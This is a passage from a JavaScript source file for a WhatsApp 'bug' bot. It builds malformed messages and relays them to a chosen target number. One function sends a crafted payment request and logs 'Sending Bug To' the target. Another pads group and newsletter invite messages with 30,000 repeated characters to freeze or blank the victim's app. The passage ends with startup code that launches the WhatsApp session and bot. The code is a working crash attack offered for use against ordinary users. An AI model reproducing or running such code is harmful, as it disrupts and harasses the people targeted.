                amount1000: 1000000,
                requestFrom: target,
                noteMessage: {
                    extendedTextMessage: {
                        text: 'Pembayaran Layanan'
                    }
                },
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400,
                amount: {
                    value: 1000,
                    offset: 1000,
                    currencyCode: 'IDR'
                },
                background: {
                    id: '1' 
                }
            }
    }

    try {
    await sock.relayMessage(target, Msg, 
    {
      participant: { jid: target }
    });
    console.log(`Sucses Sending Bug To ${target}`);
  } catch (e) {
    console.log(e);
  }
}

async function blankuiiiiii(sock, target) {

  const uni = "ꦾ".repeat(30000)  
  
  const NeoGrup = await Promise.all(
    Array.from({ length: 3 }, (_, i) =>
      generateWAMessageFromContent(
        target,
        {
          groupInviteMessage: {
            groupJid: `1234567890-12345${i}@g.us`,
            inviteCode: "NeO" + i,
            inviteExpiration: null,
            groupName: "Maklu Busuk" + (i + 1) + " " + uni,
            caption: "YUK-O ARE HERE" + (i + 1) + " " + uni,
            jpegThumbnail: null
          }
        },
        {}
      )
    )
  )

  const NeoCh = await Promise.all(
    Array.from({ length: 2 }, (_, i) =>
      generateWAMessageFromContent(
        target,
        {
          newsletterAdminInviteMessage: {
            newsletterJid: "120363424081787233@newsletter",
            newsletterName: "𝘠𝘶𝘬𝘰 - 𝘈𝘱𝘱𝘉𝘶𝘨" + (i + 1) + " " + uni,
            caption: "𝘠𝘶𝘬𝘰" + (i + 1) + " " + uni,
            inviteExpiration: null
          }
        },
        {}
      )
    )
  )

  for (const m of [...NeoGrup, ...NeoCh]) {
    await sock.relayMessage(
      target,
      m.message,
      { messageId: m.key.id }
    )
  }
}
///////////////////[END FUNC]////////////////
// --- Jalankan Bot ---
(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
`));

startSesi();
bot.launch();
})();